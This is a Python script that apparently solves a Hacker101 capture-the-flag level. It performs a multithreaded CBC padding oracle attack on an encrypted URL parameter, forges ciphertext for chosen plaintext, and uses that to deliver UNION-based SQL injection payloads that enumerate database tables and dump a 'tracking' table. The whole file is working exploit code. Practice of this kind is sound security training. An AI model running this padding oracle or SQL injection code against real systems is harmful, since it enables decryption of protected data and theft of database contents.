# Example:
# python3 main.py 'http://35.190.155.168/a4f0863709/?post=C1R8KPdiqzFlAl-F!oI-Uusszt6iMYZYpp4kgEuzXJ30LE8wLHwo5V8Hhxzn8d6Q-GwtaJXuTVMo0xxwWPYDSjCRhCbNPY915y-vLmkXNtPnbpDnzp0o!qAJKVQmWTxXRqjWG1I3KZ6WrPktcGm920WZjk!1R0eRIhIWHqpNB4mqs5CZtCPPKZm-w2QAwmbnfdLiDj33Su2nEVYgtofaBw~~'

import re
import sys
import time
import os
import base64
import binascii
import requests
import threading
import copy
import json
from enum import Enum
from datetime import datetime
import logging
import queue as queue

__fmt__='%(levelname)s %(funcName)s: %(message)s '
logging.basicConfig(level=logging.INFO, format=__fmt__)

BLOCK_SIZE = 16
URL_PREFIX = ""
PRE_CALC_CT_BLOCK = [0] * 16
PRE_CALC_PrePT_BLOCK = [0] * 16

f = lambda x : (x if isinstance(x, int) else ord(x))

pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

b64d = lambda x: binascii.a2b_base64(x.replace('~', '=').replace('!', '/').replace('-', '+'))
b64e = lambda x: str(binascii.b2a_base64(x, newline=False)).replace('b\'', '').replace('\'', '').replace('=', '~').replace('+', '-').replace('/', '!')

curTime = lambda: str(datetime.now().strftime("%H:%M:%S"))

threadLock_get_prePT_for_block_b = threading.Lock()
maxthreads_get_prePT_for_block_b = 5
sema_get_prePT_for_block_b = threading.Semaphore(value=maxthreads_get_prePT_for_block_b)

threadLock_try_k_at_pos = threading.Lock()
maxthreads_try_k_at_pos = 24  # Best performance in my environment
sema_try_k_at_pos = threading.Semaphore(value=maxthreads_try_k_at_pos)

class NotFoundError(Exception):
   """ Raised when couldn't find the expected item """
   pass

def urlToCT(url):
    data = b64d(url.split("/?post=", 1)[1])
    tmpl = list(bytes(data))
    return [tmpl[i:i+16] for i in range(0, len(tmpl), 16)] # 2 dimentional list

def CTToUrl(CT):
    blocknum = len(CT)
    tmpl = [ CT[b][i] for b in range(0, blocknum) for i in range(0, BLOCK_SIZE) ]
    data = bytearray(tmpl)
    url = URL_PREFIX + b64e(data)
    return url

class FindkResult(Enum):
    NotFound = 0
    FoundPotential = 1
    FoundFlag = 2

def sendHttpRequest(url):
    response = None
    for _ in range(100):
        try:
            response = requests.get(url)
            break
        except (requests.ConnectionError):
            logging.info("Connection timeout. Retrying")
        time.sleep(3)

    if response.status_code == 404:
        raise Exception("404 Not Found. The url is no longer available. "
                "Please go to hacker101 and reset the page")

    try:
        return str(response.content)
    except Exception as e:
        logging.error("Other Error: " + str(e) + ". url = " + url)
        raise Exception("Other error occured when sending http request")


class Job_try_k_at_pos(threading.Thread):

    def __init__(self, k, test_pos, cooked_IV, CT_block, out_queue, threads):
        threading.Thread.__init__(self)

        self.shutdown_flag = threading.Event()
        self.k = k
        self.pos = test_pos
        self.cooked_IV = copy.deepcopy(cooked_IV)
        self.CT_block = copy.deepcopy(CT_block)
        self.out_queue = out_queue
        self.threads = threads
 
    def run(self):
        sema_try_k_at_pos.acquire()
        if not self.shutdown_flag.is_set():
            # filling a byte for the previous ciphertext block
            self.cooked_IV[self.pos] = self.k
            url = CTToUrl([self.cooked_IV, self.CT_block])
            resp = sendHttpRequest(url)
            result = FindkResult.NotFound

            if ("PaddingException" not in resp):
                result = FindkResult.FoundPotential
                if ("FLAG" in resp):
                    result = FindkResult.FoundFlag
                    threadLock_try_k_at_pos.acquire()
                    for t in self.threads:
                        t.shutdown_flag.set()
                    threadLock_try_k_at_pos.release()
                elif ("doctype html" in resp):
                    result = FindkResult.FoundPotential

            threadLock_try_k_at_pos.acquire()
            self.out_queue.put((result, self.k))
            threadLock_try_k_at_pos.release()
            time.sleep(0.5)

        sema_try_k_at_pos.release()


def decrypt_CT_block(CT_block):

    cooked_IV = [0] * 16
    prePT_block = [0] * 16

    for pos in range(15, -1, -1):
        pad = 16 - pos

        for i in range(15, pos, -1):
            cooked_IV[i] = (prePT_block[i] ^ pad)

        my_queue = queue.Queue()
        my_queue.queue.clear()
        threads = []

        for k in range(0, 256):
            t = Job_try_k_at_pos(k, pos, cooked_IV, CT_block, my_queue, threads)
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        found_potential_k = False
        best_k = 0
        while not my_queue.empty():
            (result, k) = my_queue.get()
            if result == FindkResult.FoundFlag:
                found_potential_k = True
                best_k = k
                break
            elif result == FindkResult.FoundPotential:
                found_potential_k = True
                best_k = k

        if not found_potential_k:
            raise NotFoundError("Unable to find prePT_block[" + str(pos) + "] ")

        prePT_block[pos] = (best_k ^ pad)

    return prePT_block[0:16]


def get_prePT_for_block_b(CT, b, out_queue):
    sema_get_prePT_for_block_b.acquire()

    logging.info("Calculating for Block " + str(b) + " ...")

    prePT_block = [0] * 16
    prePT_block = decrypt_CT_block(CT[b])
    threadLock_get_prePT_for_block_b.acquire()
    out_queue.put((b, prePT_block))
    logging.info("Done with Block " + str(b))

    threadLock_get_prePT_for_block_b.release()
    sema_get_prePT_for_block_b.release()

def decrypt_CT_and_get_PT_prePT(url):
    CT = urlToCT(url)
    blocknum = len(CT)
    CT_array = [ CT[b][i] for b in range(0, blocknum) for i in range(0, BLOCK_SIZE) ]

    my_queue = queue.Queue()
    threads = []

    for b in range(blocknum - 1, 0, -1):
        t = threading.Thread(target=get_prePT_for_block_b, args=(CT, b, my_queue,))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    prePT_block = [0] * 16
    prePT = [[0] * 16 for _ in range(blocknum)]
    PT    = [[0] * 16 for _ in range(blocknum)]

    while not my_queue.empty():
        (b , prePT_block) = my_queue.get()
        prePT[b] = prePT_block


    for b in range(blocknum - 1, 0, -1):
        prePT_block = prePT[b]
        PT_block = [0] * 16
        PT_block = [ prePT_block[i] ^ f(CT[b-1][i]) for i in range(0, BLOCK_SIZE) ]
        PT[b] = copy.deepcopy(PT_block)

    return prePT, PT


def get_2nd_flag(orig_url):
    orig_prePT, orig_PT = decrypt_CT_and_get_PT_prePT(orig_url)
    CT = urlToCT(orig_url)
    blocknum = len(CT)
    orig_PT_array = [ orig_PT[b][i] for b in range(0, blocknum) for i in range(0, BLOCK_SIZE) ]
    jstr = unpad(bytearray(orig_PT_array[BLOCK_SIZE:])).decode("utf-8")
    jobj = json.loads(jstr)
    flag_str = jobj['flag']
    logging.info("flag found = " + flag_str)

    return flag_str

def get_PRE_CALC_CT_prePT_block():
    global PRE_CALC_CT_BLOCK
    global PRE_CALC_PrePT_BLOCK
    if ((not any(PRE_CALC_PrePT_BLOCK)) and (not any(PRE_CALC_CT_BLOCK))):
        PRE_CALC_PrePT_BLOCK = decrypt_CT_block(PRE_CALC_CT_BLOCK)

    return PRE_CALC_CT_BLOCK, PRE_CALC_PrePT_BLOCK

def desired_str_to_PT(desired_PT_str):
    padded_desired_PT_str = pad(desired_PT_str)
    blocknum = int(len(padded_desired_PT_str) / 16)
    desired_PT = [[0] * 16 for _ in range(blocknum)]
    desired_PT = [padded_desired_PT_str[i:i+16] \
            for i in range(0, len(padded_desired_PT_str), 16)] # 2 dimentional list
    desired_PT.insert(0, [0] * 16)
    blocknum = blocknum + 1
    return blocknum, desired_PT

def gen_CT_for_desired_PT_str(desired_PT_str):

    blocknum, desired_PT = desired_str_to_PT(desired_PT_str)
    pre_calc_CT_block, pre_calc_prePT_block = get_PRE_CALC_CT_prePT_block()
    cooked_CT    = [[0] * 16 for _ in range(blocknum)]
    cooked_prePT = [[0] * 16 for _ in range(blocknum)]
    cooked_CT[-1]    = copy.deepcopy(pre_calc_CT_block)
    cooked_prePT[-1] = copy.deepcopy(pre_calc_prePT_block)

    for b in range(blocknum - 1, 0, -1):
        cooked_CT[b-1] = [ cooked_prePT[b][i] ^ f(desired_PT[b][i]) for i in range(0, 16) ]
        if (b-1 > 0):
            cooked_prePT[b-1] = decrypt_CT_block(cooked_CT[b-1])

    return cooked_CT

def get_1st_and_3rd_flag():
    desired_PT_str = '{"id":"1"}'
    cooked_url = CTToUrl(gen_CT_for_desired_PT_str(desired_PT_str))
    resp_str = str(requests.get(cooked_url).content)
    flags = re.findall('\^FLAG\^.+?\$FLAG\$', resp_str)
    logging.info("flags found = ")
    logging.info(flags)

def get_3rd_and_4th_flag():
    # desired_PT_str = '{"id":"1 AND 1=2 UNION SELECT database(),1"}'
    # desired_PT_str = '{"id":"1 AND 1=2 UNION SELECT group_concat(table_name),1 FROM information_schema.tables WHERE table_schema=\'level3\'"}'
    # desired_PT_str = '{"id":"1 AND 1=2 UNION SELECT group_concat(column_name),1 FROM information_schema.columns WHERE table_name=\'posts\'"}'
    # desired_PT_str = '{"id":"1 AND 1=2 UNION SELECT group_concat(column_name),1 FROM information_schema.columns WHERE table_name=\'tracking\'"}'
    desired_PT_str = '{"id":"1 AND 1=2 UNION SELECT group_concat(id,headers), 1 FROM tracking"}'
    cooked_url = CTToUrl(gen_CT_for_desired_PT_str(desired_PT_str))
    resp_str = str(requests.get(cooked_url).content)
    final_link = resp_str.split("/?post=")[1].split("\\r\\nUser-Agent")[0]
    final_link = URL_PREFIX + final_link
    resp_str = str(requests.get(final_link).content)
    flags = re.findall('\^FLAG\^.+?\$FLAG\$', resp_str)
    flags = list(dict.fromkeys(flags))
    logging.info("flags found = ")
    logging.info(flags)

if __name__ == "__main__":
    arg_num = len(sys.argv)
    if (arg_num != 2):
        err_str = "Wrong Input. Input format: ./script.py 'http://....."
        sys.exit(err_str)

    start = time.time()

    orig_url = str(sys.argv[1])
    URL_PREFIX = orig_url.split('=', 1)[0] + '='

    # Sanatization check: see if the server is still available
    sendHttpRequest(orig_url) 
    
    get_2nd_flag(orig_url)
    get_1st_and_3rd_flag()
    get_3rd_and_4th_flag()

    end = time.time()
    hours, rem = divmod(end-start, 3600)
    minutes, seconds = divmod(rem, 60)
    logging.info("Duration = %d hour %d min %d sec" % (int(hours),int(minutes),int(seconds)))